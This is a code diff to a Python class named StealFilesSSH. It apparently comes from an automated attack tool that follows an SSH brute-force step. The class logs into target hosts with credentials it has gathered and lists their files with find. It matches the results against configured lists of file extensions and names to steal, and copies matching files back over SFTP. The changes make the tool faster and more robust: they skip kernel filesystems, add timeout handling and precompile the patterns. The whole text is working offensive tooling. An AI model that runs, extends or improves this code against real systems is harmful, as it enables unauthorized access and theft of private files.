@@ -27,7 +27,7 @@ class StealFilesSSH:
     def __init__(self, shared_data):
         try:
             self.shared_data = shared_data
-            self.sftp_connected = False
+            self.ssh_connected = False  # Set when SSH connects (before SFTP)
             self.stop_execution = False
             self.b_parent_action = "brute_force_ssh"  # Parent action status key
             logger.info("StealFilesSSH initialized")
@@ -46,6 +46,7 @@ class StealFilesSSH:
                 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                 ssh.connect(ip, username=username, password=password,
                            timeout=30, banner_timeout=30, auth_timeout=30)
+                self.ssh_connected = True  # Mark SSH as connected
                 logger.info(f"Connected to {ip} via SSH with username {username}")
                 return ssh
             except Exception as e:
@@ -88,7 +89,8 @@ class StealFilesSSH:
         Uses timeout on exec_command. Saves full file listing to recon directory.
         """
         try:
-            stdin, stdout, stderr = ssh.exec_command(f'find {dir_path} -type f -maxdepth 10 2>/dev/null', timeout=60)
+            # Exclude virtual filesystems (proc/sys/dev) which have thousands of kernel files
+            stdin, stdout, stderr = ssh.exec_command(f'find {dir_path} -maxdepth 5 -type f ! -path "/proc/*" ! -path "/sys/*" ! -path "/dev/*" 2>/dev/null', timeout=60)
             # Read with timeout using channel
             stdout.channel.settimeout(60)
             files = stdout.read().decode().splitlines()
@@ -99,18 +101,27 @@ class StealFilesSSH:
 
             logger.info(f"Discovered {len(files)} total files on {ip or 'target'}")
 
+            # Pre-compile pattern sets for faster matching
+            steal_extensions = set(self.shared_data.steal_file_extensions)
+            steal_names = set(self.shared_data.steal_file_names)
+            path_patterns = [fn for fn in steal_names if fn.startswith('/')]
+            name_patterns = [fn for fn in steal_names if not fn.startswith('/')]
+
             matching_files = []
-            for file in files:
-                if self.shared_data.orchestrator_should_exit or self.stop_execution:
-                    logger.info("File search interrupted.")
-                    return []
+            for i, file in enumerate(files):
+                # Check for exit every 1000 files instead of every file
+                if i % 1000 == 0 and (self.shared_data.orchestrator_should_exit or self.stop_execution):
+                    logger.info(f"File filtering interrupted at {i}/{len(files)} files.")
+                    break
                 basename = os.path.basename(file)
                 # Match by extension
-                if any(file.endswith(ext) for ext in self.shared_data.steal_file_extensions):
+                if any(file.endswith(ext) for ext in steal_extensions):
                     matching_files.append(file)
-                # Match by name: path patterns (start with /) match end of path, others match basename
-                elif any(file.endswith(fn) if fn.startswith('/') else fn == basename
-                         for fn in self.shared_data.steal_file_names):
+                # Match by path pattern (ends with /pattern)
+                elif any(file.endswith(fn) for fn in path_patterns):
+                    matching_files.append(file)
+                # Match by basename
+                elif basename in name_patterns:
                     matching_files.append(file)
             logger.info(f"Found {len(matching_files)} matching files to steal in {dir_path}")
             return matching_files
@@ -125,7 +136,6 @@ class StealFilesSSH:
         """
         try:
             sftp = ssh.open_sftp()
-            self.sftp_connected = True  # Mark SFTP as connected
             remote_dir = os.path.dirname(remote_file)
             local_file_dir = os.path.join(local_dir, os.path.relpath(remote_dir, '/'))
             os.makedirs(local_file_dir, exist_ok=True)
@@ -142,6 +152,10 @@ class StealFilesSSH:
         """
         Steal files from the remote server using SSH.
         """
+        # Reset state from any previous runs
+        self.stop_execution = False
+        self.ssh_connected = False
+
         start_time = time.time()
         logger.lifecycle_start("StealFilesSSH", ip, port)
         try:
@@ -172,10 +186,10 @@ class StealFilesSSH:
 
                 def handle_timeout():
                     """
-                    Timeout handler to stop the execution if no SFTP connection is established.
+                    Timeout handler to stop the execution if no SSH connection is established.
                     """
-                    if not self.sftp_connected:
-                        logger.lifecycle_timeout("StealFilesSSH", "SFTP connection", 240, ip)
+                    if not self.ssh_connected:
+                        logger.lifecycle_timeout("StealFilesSSH", "SSH connection", 240, ip)
                         self.stop_execution = True
 
                 # Use TimeoutContext instead of Timer(240)
